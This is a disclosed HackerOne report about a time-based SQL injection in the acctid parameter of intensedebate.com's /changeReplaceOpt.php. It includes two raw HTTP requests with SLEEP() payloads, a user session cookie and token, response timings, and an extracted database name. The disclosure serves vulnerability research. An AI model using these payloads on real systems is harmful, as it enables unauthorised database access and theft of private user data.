---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1042746'
original_report_id: '1042746'
title: '[intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php'
weakness: SQL Injection
team_handle: automattic
created_at: '2020-11-24T22:49:14.893Z'
disclosed_at: '2021-01-01T09:20:01.622Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 72
tags:
- hackerone
- sql-injection
---

# [intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php

## Metadata

- HackerOne Report ID: 1042746
- Weakness: SQL Injection
- Program: automattic
- Disclosed At: 2021-01-01T09:20:01.622Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary 

Hello, i have found a SQLI Injection Time Based on `https://www.intensedebate.com/changeReplaceOpt.php`.

The parameter `$_GET['acctid']` is vulnerable.



## Detection

I have inject a MySQL function `sleep()`,  and it works.


```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

Response time: 15 414 millis.


```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(7) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

7 486 millis.

## POC 

database() : id_commxn2s


Thank you, good bye.

## Impact

Full database access holding private user information.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
